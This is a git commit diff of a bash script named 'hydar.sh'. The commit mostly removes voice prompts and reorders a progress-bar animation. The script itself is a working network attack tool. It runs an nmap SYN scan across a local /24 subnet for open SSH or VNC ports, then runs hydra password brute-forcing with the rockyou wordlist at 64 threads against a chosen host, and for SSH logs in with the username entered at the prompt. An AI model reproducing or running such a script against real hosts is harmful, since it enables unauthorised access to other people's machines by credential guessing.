3dd41b10dc0c24fd872f60103a189ece39b96f7a
anona <39059459+WilSegale@users.noreply.github.com>
2022-07-02 18:58:21 -0400

    scripts

--- mac/hydar.sh
+++ mac/hydar.sh
@@ -1,37 +1,33 @@
 #!/bin/bash
-sudo rm -rf output.txt
-clear
-echo "Loading..." && say "Loading"
-for ((k = 0; k <= 10; k++)); do
-    echo -n "[ "
-    for ((i = 0; i <= k; i++)); do echo -n "|||"; done
-    sleep 1
-    for ((j = i; j <= 10; j++)); do echo -n "  "; done
-    v=$((k * 10))
-    echo -n " ] "
-    echo -n "$v%" $'\r'
-done
-echo
 chmod +x *
 
 clear
-echo 'Starting...' && say "Starting..."
+echo "Loading..."
+for ((k = 0; k <= 10; k++)); do
+    echo -n "[ "
+    for ((i = 0; i <= k; i++)); do echo -n "|||"; done
+        sleep 1
+        for ((j = i; j <= 10; j++)); do echo -n "  "; done
+            v=$((k * 10))
+            echo -n " ] "
+            echo -n "$v%" $'\r'
+done
+echo
+
+clear
+echo 'Starting...'
 function run() {
     clear
     read -p "Do you want SSH(22) or VNC(5900). To see all type (ALL): " service
 
     if [[ $service == "ALL" ]]; then
         sudo nmap -sS 192.168.1.1/24 --open
-        say "Scan is done"
-
 
     elif [[ $service == "all" ]]; then
-        sudo nmap -sS 192.168.1.1/24 --open
-        say "Scan is done"
+        sudo nmap -sS 192.168.1.1/24 --open        
+
     else
         sudo nmap -sS 192.168.1.1/24 -p $service --open
-        say "Scan is done"
-
     fi
 
     echo "To crack VNC(5900) type 'NONE' in the input username"
@@ -40,7 +36,6 @@ function run() {
 
     if [ $user == "NONE" ]; then
         hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host
-        
     else
         hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
         ssh $user@$host
